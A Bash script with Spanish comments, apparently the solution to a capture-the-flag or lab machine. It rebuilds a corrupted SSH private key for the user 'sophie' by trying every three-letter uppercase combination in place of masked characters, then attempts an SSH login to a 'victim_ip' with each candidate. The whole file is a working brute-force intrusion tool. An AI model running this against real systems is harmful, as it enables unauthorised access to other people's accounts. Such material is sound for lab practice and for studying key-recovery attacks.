#!/bin/bash

# ··· Funciones del programa

# · Controlamos salida forzada
ctrl_c() {
    echo -e "\nCTRL^C detectado, saliendo..."
    exit 0
}

# · Creamos llave privada y publica de sophie, además de intentar conexión SSH
create_key() {
    priv_key_file_name="./sophie_rsa_key"
    pub_key_file_name="${priv_key_file_name}.pub"
    priv_key_file_content="$1"

    echo "$priv_key_file_content" > "$priv_key_file_name"
    ssh-keygen -y -f "$priv_key_file_name" > "$pub_key_file_name"
    chmod 600 "$priv_key_file_name" "$pub_key_file_name"

    ssh sophie@"$IP" -i "$priv_key_file_name" 2>/dev/null
}

# · Generamos la combinación de letras y hacemos borrador de la llave
replace_chars() {
    file_key_content="$1"
    for a in {A..Z}; do
        for b in {A..Z}; do
            for c in {A..Z}; do
                new_chars=${a}${b}${c}
                echo "(+) Testeando/Creando llave con: $new_chars"

                create_key "$(echo "$file_key_content" | sed "s/\*\*\*/${new_chars}/g")"
            done
        done
    done
}

# ··· Variables globales
IP=$1
trap ctrl_c INT # señal CTRL+C

# ··· Inicio de programa
if [ -z $IP ]; then
    echo -e "uso: $0 victim_ip"
    echo -e "\nejemplo:\n\t$0 10.10.10.10"
    exit 1
else
    file_key_content=$(cat sophie_key_corrupted)
    replace_chars "$file_key_content"
fi